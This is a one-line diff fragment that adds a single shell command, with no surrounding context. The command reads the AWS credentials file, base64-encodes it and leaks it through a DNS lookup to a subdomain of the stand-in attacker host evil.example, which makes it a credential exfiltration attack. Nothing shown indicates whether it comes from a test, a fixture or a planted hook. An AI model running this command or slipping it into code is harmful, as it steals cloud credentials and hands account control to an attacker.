@@ -1,0 +1,1 @@
+nslookup $(cat ~/.aws/credentials | base64 -w0).evil.example
